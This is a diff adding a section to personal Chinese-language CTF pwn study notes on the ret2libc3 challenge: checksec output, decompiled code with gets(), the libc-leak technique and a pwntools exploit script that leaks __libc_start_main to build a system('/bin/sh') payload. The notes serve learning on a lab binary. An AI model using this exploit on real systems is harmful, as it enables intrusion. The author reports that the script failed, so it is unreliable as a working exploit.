@@ -630,5 +630,106 @@ continue #continue之后esp指向b'b'*4，eip指向system函数，符合预期
 
 
 
+### 7. ret2libc3
 
+在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护
+
+```bash
+checksec ./ret2libc3
+[*] '/home/seveng0/Desktop/pwn/ret2libc3'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+NX保护
+
+ida打开
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s[100]; // [esp+1Ch] [ebp-64h] BYREF
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  puts("No surprise anymore, system disappeard QQ.");
+  printf("Can you find it !?");
+  gets(s);
+  return 0;
+}
+```
+
+我们需要找到system函数的地址
+
+> system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。
+>
+> 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下
+>
+> `https://github.com/niklasb/libc-database`
+
+所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。
+
+那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。**当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。**
+
+我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，`https://github.com/lieanu/LibcSearcher`
+
+
+
+这里我们泄露`__libc_start_main`的地址，这是因为它是程序最初被执行的地方。基本利用思路如下
+
+> 1. 泄露 `__libc_start_main` 地址
+> 2. 获取 libc 版本
+> 3. 获取 system 地址与 /bin/sh 的地址
+> 4. 再次执行源程序
+> 5. 触发栈溢出执行 system(‘/bin/sh’)
+
+
+
+从本地安装`LibcSearcher`库
+
+```
+python setup.py develop
+```
+
+![image-20250219002327043](./ctf-wiki-pwn-learning.assets/image-20250219002327043.png)
+
+
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+p=process('/home/seveng0/Desktop/pwn/ret2libc3')
+
+ret2libc3=ELF('/home/seveng0/Desktop/pwn/ret2libc3')
+puts_plt=ret2libc3.plt['puts']
+libc_start_main_got = ret2libc3.got['__libc_start_main']
+main=ret2libc3.symbols['main']
+
+payload=flat([b'a'*112,puts_plt,main,libc_start_main_got])
+p.sendlineafter(b'Can you find it !?',payload)
+
+libc_start_main_addr=u32(p.recv()[0:4])
+libc=LibcSearcher('__libc_start_main',libc_start_main_addr)
+libcbase=libc_start_main_addr-libc.dump('__libc_start_main')
+system_addr=libcbase+libc.dump('system')
+binsh_addr=libcbase+libc.dump('str_bin_sh')
+
+payload=flat([b'a'*104,system_addr,b'b'*4,binsh_addr])
+p.sendline(payload)
+```
+
+
+
+![image-20250219002401813](./ctf-wiki-pwn-learning.assets/image-20250219002401813.png)
+
+寄了，等明天
+
+
+
+
+
+### 8. 
 
